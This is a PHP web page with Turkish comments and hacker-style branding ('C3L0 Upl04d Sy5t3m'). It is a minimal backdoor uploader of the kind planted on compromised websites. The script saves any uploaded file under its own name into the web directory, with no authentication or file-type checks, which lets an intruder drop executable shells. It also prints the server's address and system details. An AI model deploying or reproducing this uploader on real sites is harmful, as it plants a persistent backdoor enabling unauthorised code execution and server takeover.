<?php
// Upload işlemi kontrol edilir
if(isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { 
        $message = '<div class="success-msg">[+] DOSYA YÜKLENDİ -CELO!!! [+]</div>';
    } else { 
        $message = '<div class="error-msg">[-] DOSYA YÜKLENMEDİ -CELO!!! [-]</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C3L0 Upl04d Sy5t3m</title>
    <style>
        body {
            background-color: #0a0a0a;
            color: #0f0;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }
        .container {
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background-color: #111;
            border: 1px solid #0f0;
            box-shadow: 0 0 10px #0f0, 0 0 20px rgba(0,255,0,0.2);
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 1px solid #0f0;
            padding-bottom: 15px;
        }
        .header h1 {
            margin: 0;
            font-size: 24px;
            color: #0f0;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .header pre {
            margin: 20px 0 0;
            font-size: 10px;
            color: #0f0;
        }
        .upload-form {
            margin: 20px 0;
            text-align: center;
        }
        .file-wrapper {
            position: relative;
            overflow: hidden;
            display: inline-block;
            margin-bottom: 15px;
            width: 80%;
        }
        .file-input {
            position: absolute;
            font-size: 100px;
            opacity: 0;
            right: 0;
            top: 0;
        }
        .file-trigger {
            display: inline-block;
            background-color: #111;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 10px 20px;
            cursor: pointer;
            width: 100%;
            box-sizing: border-box;
        }
        .file-trigger:hover {
            background-color: #060;
            color: #000;
        }
        .submit-btn {
            background-color: #0a0a0a;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 10px 25px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
            font-weight: bold;
            transition: all 0.3s;
            margin-top: 10px;
        }
        .submit-btn:hover {
            background-color: #0f0;
            color: #000;
            box-shadow: 0 0 10px #0f0;
        }
        .success-msg {
            background-color: #001800;
            color: #0f0;
            padding: 10px;
            margin: 15px 0;
            border: 1px solid #0f0;
            text-align: center;
            font-weight: bold;
        }
        .error-msg {
            background-color: #180000;
            color: #f00;
            padding: 10px;
            margin: 15px 0;
            border: 1px solid #f00;
            text-align: center;
            font-weight: bold;
        }
        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #0f0;
            border-top: 1px solid #0f0;
            padding-top: 15px;
        }
        .stats {
            margin-top: 20px;
            padding: 10px;
            background-color: #0a0a0a;
            border: 1px dashed #0f0;
            font-size: 12px;
        }
        .blink {
            animation: blinker 1s linear infinite;
        }
        @keyframes blinker {
            50% { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>[ C3L0 Fil3 Upl0ad3r ]</h1>
            <pre>
  _____   _____ _      ____     _    _ _____  _      ____          _____  ______ _____  
 / ____| |_   _| |    / __ \   | |  | |  __ \| |    / __ \   /\   |  __ \|  ____|  __ \ 
| |        | | | |   | |  | |  | |  | | |__) | |   | |  | | /  \  | |  | | |__  | |__) |
| |        | | | |   | |  | |  | |  | |  ___/| |   | |  | |/ /\ \ | |  | |  __| |  _  / 
| |____   _| |_| |___| |__| |  | |__| | |    | |___| |__| / ____ \| |__| | |____| | \ \ 
 \_____|_|_____|______\____/___ \____/|_|    |______\____/_/    \_\_____/|______|_|  \_\
                       |___|____|                                                        
            </pre>
        </div>
        
        <?php if(isset($message)) echo $message; ?>
        
        <div class="upload-form">
            <form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">
                <div class="file-wrapper">
                    <span class="file-trigger">[ Seç Dosya ]</span>
                    <input type="file" name="file" id="file-input" class="file-input">
                </div>
                <input type="submit" name="_upl" id="_upl" value="Upload" class="submit-btn">
            </form>
        </div>
        
        <div class="stats">
            <span class="blink">></span> Server IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br>
            <span class="blink">></span> Your IP: <?php echo $_SERVER['REMOTE_ADDR']; ?><br>
            <span class="blink">></span> System: <?php echo php_uname(); ?><br>
            <span class="blink">></span> Time: <?php echo date('Y-m-d H:i:s'); ?>
        </div>
        
        <div class="footer">
            [ C3L0 Upl04d Sy5t3m v1.0 ] | [ Access Granted ] | [ <?php echo date('Y'); ?> ]
        </div>
    </div>

    <script>
        // Dosya seçildiğinde dosya adını göster
        document.getElementById('file-input').onchange = function() {
            var filename = this.value.split('\\').pop();
            if(filename) {
                document.querySelector('.file-trigger').textContent = filename;
            } else {
                document.querySelector('.file-trigger').textContent = '[ Seç Dosya ]';
            }
        };
    </script>
</body>
</html>
